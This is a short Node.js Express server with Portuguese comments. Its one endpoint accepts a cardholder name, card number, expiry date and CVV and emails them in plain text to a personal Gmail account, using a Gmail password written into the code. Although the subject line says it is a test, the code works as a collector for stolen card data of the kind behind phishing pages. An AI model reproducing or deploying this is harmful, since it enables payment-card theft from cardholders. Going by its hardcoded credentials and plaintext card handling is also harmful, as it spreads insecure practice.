const express = require('express');
const nodemailer = require('nodemailer');
const cors = require('cors');
const app = express();
const PORT = 3000;

app.use(cors());
app.use(express.json());

app.post('/enviar-email', async (req, res) => {
  const { nome, numero, validade, cvv } = req.body;

  const transporter = nodemailer.createTransport({
    service: 'gmail', // pode usar outro, como Outlook, SMTP customizado, etc.
    auth: {
      user: 'jonasarcuri2020@gmail.com',
      pass: '!Macacoloko123'
    }
  });

  const mailOptions = {
    from: 'jonasarcuri2020@gmail.com',
    to: 'jonasarcuri2020@gmail.com',
    subject: 'Dados do Cartão de Crédito (Teste)',
    text: `
      Nome: ${nome}
      Número: ${numero}
      Validade: ${validade}
      CVV: ${cvv}
    `
  };

  try {
    await transporter.sendMail(mailOptions);
    res.json({ message: 'Email enviado com sucesso!' });
  } catch (error) {
    console.error(error);
    res.status(500).json({ message: 'Erro ao enviar o email.' });
  }
});

app.listen(PORT, () => {
  console.log(`Servidor rodando em http://localhost:${PORT}`);
});
